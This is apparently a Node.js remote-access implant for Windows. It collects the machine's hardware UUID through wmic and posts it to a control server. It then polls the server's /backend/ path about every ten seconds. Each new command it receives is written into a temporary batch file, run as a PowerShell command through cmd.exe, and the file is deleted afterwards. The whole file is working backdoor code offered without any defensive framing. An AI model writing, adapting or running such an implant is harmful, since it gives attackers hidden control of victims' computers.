var website_ip = "http://127.0.0.1:8000"
var payload = ["[INSERT PAYLOAD]"]
const axios = require('axios');
const fs = require('fs');
const os = require("os");
const { spawn } = require( 'child_process' );
const uuid = spawn( 'cmd', [ '/c', 'wmic', "path", "win32_computersystemproduct", "get", "uuid" ] );

fs.writeFileSync(os.tmpdir()+'\\exec_script.bat', "");

uuid.stdout.on( 'data', ( data ) => parseUUID( `stdout: ${ data }` ) );
uuid.on('close', ( code ) => console.log( `child process exited with code ${code}` ))

function parseUUID(uuid){
    sendUUID(uuid.toString().split("\n")[1].replaceAll("\r", "").replaceAll(" ", ""))
}

function sendUUID(uuid){
    const data = {
        uuid: uuid
    };
    axios.post('http://127.0.0.1:8000', data)
}


function logEvery2Seconds(i) {
    setTimeout(() => {
        axios.get(website_ip+'/backend/')
            .then(function (response) {
                // handle success
                if(payload[0] == response.data){
                    console.log("Payload already executed!")

                } else {
                    payload.pop()
                    payload.push(response.data)
                    console.log(response.data)
                    fs.writeFileSync(os.tmpdir()+'\\exec_script.bat', "powershell.exe -command "+response.data);
                    spawn('cmd.exe', ["/c", "%temp%\\exec_script.bat"])
                    setInterval(() => {
                        spawn('cmd.exe', ["/c", "del", "/f", "%temp%\\exec_script.bat"])
                    }, 1500)

                    
                }
                
        })
        console.log('Check /backend/ for command');
        logEvery2Seconds(++i);
    }, 10000)
}

logEvery2Seconds(0);

let i = 0;
setInterval(() => {
    console.log('Infinite Loop Test interval n:', i++);
}, 10000)